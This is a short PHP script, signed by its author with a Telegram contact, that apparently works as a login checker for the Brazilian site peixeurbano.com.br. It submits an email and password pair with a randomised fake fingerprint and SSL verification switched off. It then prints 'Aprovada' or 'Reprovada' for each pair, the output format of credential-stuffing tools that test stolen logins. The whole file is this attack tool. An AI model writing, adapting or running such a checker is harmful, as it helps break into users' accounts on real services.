<?php

/*-------------------*/
#  Coded By Hyperguy  # 
#   t.me/SpiritCoder  #
#     2019/01/14      #
/*-------------------*/


ini_set("max_execution_time", 0);
ini_set("memory_limit", "-1");


$email = 'email@provedor.com';
$senha = 'Hyperguy';

function catcha($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

function DelCookie()
{
	if(file_exists('Cookie.txt'))
	{
		unlink('Cookie.txt');
	}
}

DelCookie();

$headers = array('Referer: https://www.peixeurbano.com.br/login',
	'Content-Type: application/x-www-form-urlencoded',
		'Accept-Language: pt-BR',
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Host: www.peixeurbano.com.br',
					'Connection: Keep-Alive');

function _curl($url, $post, $headers, $email, $senha)
{

	$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, $url);

			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);

					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

						curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

							curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

								curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/Cookie.txt');

									curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/Cookie.txt');

									curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

										curl_setopt($ch, CURLOPT_POST, true);

											curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

												$log = curl_exec($ch);

													$errors = curl_error($ch);

													 	echo $log;

													 		curl_close($ch);

													 			if(strpos($log, 'E-mail ou senha inválidos'))		
													 			{
													 				echo "Reprovada-> $email|$senha";
													 			}
													 			elseif(empty($log))	
													 			{
													 				echo "Aprovada-> $email|$senha";
													 			}					 		
}

$returns = _curl('https://www.peixeurbano.com.br/login', 'ip=&fingerprint=7dbf61d8c'.rand(000000000, 999999999).'aef2d3b1b3f7b8&user_agent='.$_SERVER['HTTP_USER_AGENT'].'&platform=Win32&landing_page_url=https%3A%2F%2Fwww.peixeurbano.com.br%2Flogin%3Fclickdate%3D2018-12-08&http_referer=https%3A%2F%2Fwww.peixeurbano.com.br%2F&retURL=%2F&return_to=&email='.$email.'&password='.$senha.'', $headers, $email, $senha);



echo $returns;


?>